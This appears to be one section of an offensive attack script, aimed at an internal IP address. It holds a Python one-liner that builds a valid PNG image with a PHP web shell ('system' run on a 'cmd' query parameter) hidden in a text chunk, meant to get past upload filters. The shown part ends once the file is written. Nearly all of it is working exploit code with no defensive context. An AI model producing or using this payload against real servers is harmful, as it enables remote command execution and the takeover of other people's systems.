# 15. POLYGLOT PNG UPLOAD (Embed PHP in valid PNG)

TARGET="https://10.96.1.52"

# Step 1: Create a valid 1x1 PNG with PHP payload embedded in tEXt chunk
python3 -c "
import struct, zlib
# PNG signature
sig = b'\x89PNG\r\n\x1a\n'
# IHDR chunk (1x1 pixel, 8-bit RGB)
ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
# IDAT chunk (compressed pixel data: filter byte + RGB)
raw = b'\x00\xff\x00\x00'  # filter=none, red pixel
compressed = zlib.compress(raw)
idat_crc = zlib.crc32(b'IDAT' + compressed) & 0xffffffff
idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)
# tEXt chunk with PHP payload
payload = b'Comment\x00<?php system(\$_GET[\"cmd\"]); ?>'
text_crc = zlib.crc32(b'tEXt' + payload) & 0xffffffff
text = struct.pack('>I', len(payload)) + b'tEXt' + payload + struct.pack('>I', text_crc)
# IEND chunk
iend_crc = zlib.crc32(b'IEND') & 0xffffffff
iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
with open('/tmp/polyglot.png', 'wb') as f:
    f.write(sig + ihdr + idat + text + iend)
print('Polyglot PNG created at /tmp/polyglot.png')
"
